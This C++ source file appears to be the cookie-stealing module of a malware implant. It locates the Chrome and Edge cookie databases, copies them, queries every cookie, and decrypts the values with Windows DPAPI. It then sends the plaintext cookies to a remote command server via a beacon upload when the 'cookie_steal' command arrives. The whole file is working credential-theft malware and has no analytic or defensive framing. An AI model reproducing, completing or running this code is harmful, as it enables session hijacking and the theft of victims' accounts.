#include "cookie_stealer.h"
#include "../config.h"
#include "../utils.h"
#include "../crypto.h"
#include "../beacon.h"
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include "../../libs/sqlite3/sqlite3.h"

namespace CookieStealer {
    std::string GetChromeCookiePath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
        return std::string(path) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
    }
    
    std::string GetEdgeCookiePath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path);
        return std::string(path) + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
    }
    
    std::vector<BYTE> DecryptWithDPAPI(const std::vector<BYTE>& encrypted) {
        DATA_BLOB inBlob, outBlob;
        inBlob.cbData = (DWORD)encrypted.size();
        inBlob.pbData = (BYTE*)encrypted.data();
        
        if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
            std::vector<BYTE> result(outBlob.pbData, outBlob.pbData + outBlob.cbData);
            LocalFree(outBlob.pbData);
            return result;
        }
        return std::vector<BYTE>();
    }
    
    std::string StealFromBrowser(const std::string& dbPath) {
        std::string result;
        
        // Copy DB to temp (Chrome locks it)
        std::string tempPath = std::string(LOG_PATH) + ".cookies.tmp";
        CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE);
        
        sqlite3* db = NULL;
        if (sqlite3_open(tempPath.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            DeleteFileA(tempPath.c_str());
            return "";
        }
        
        sqlite3_stmt* stmt = NULL;
        const char* sql = "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies";
        
        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                const char* name = (const char*)sqlite3_column_text(stmt, 1);
                const void* encrypted = sqlite3_column_blob(stmt, 2);
                int encryptedLen = sqlite3_column_bytes(stmt, 2);
                const char* path = (const char*)sqlite3_column_text(stmt, 3);
                
                std::vector<BYTE> encryptedData((BYTE*)encrypted, (BYTE*)encrypted + encryptedLen);
                auto decrypted = DecryptWithDPAPI(encryptedData);
                
                result += "Host: " + std::string(host ? host : "") + "\n";
                result += "Name: " + std::string(name ? name : "") + "\n";
                result += "Value: " + std::string(decrypted.begin(), decrypted.end()) + "\n";
                result += "Path: " + std::string(path ? path : "") + "\n";
                result += "---\n";
            }
            sqlite3_finalize(stmt);
        }
        
        sqlite3_close(db);
        DeleteFileA(tempPath.c_str());
        return result;
    }
    
    void Steal() {
        std::string allCookies;
        
        std::string chromePath = GetChromeCookiePath();
        if (GetFileAttributesA(chromePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            allCookies += "=== CHROME COOKIES ===\n";
            allCookies += StealFromBrowser(chromePath);
        }
        
        std::string edgePath = GetEdgeCookiePath();
        if (GetFileAttributesA(edgePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            allCookies += "=== EDGE COOKIES ===\n";
            allCookies += StealFromBrowser(edgePath);
        }
        
        // Firefox (simplified - needs NSS library)
        // allCookies += "=== FIREFOX COOKIES ===\n";
        // Requires decryption via NSS - complex, stub for now
        
        if (!allCookies.empty()) {
            Beacon::UploadFile("cookie_steal", "cookies.txt", 
                std::vector<BYTE>(allCookies.begin(), allCookies.end()));
        }
    }
    
    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "cookie_steal") Steal();
    }
}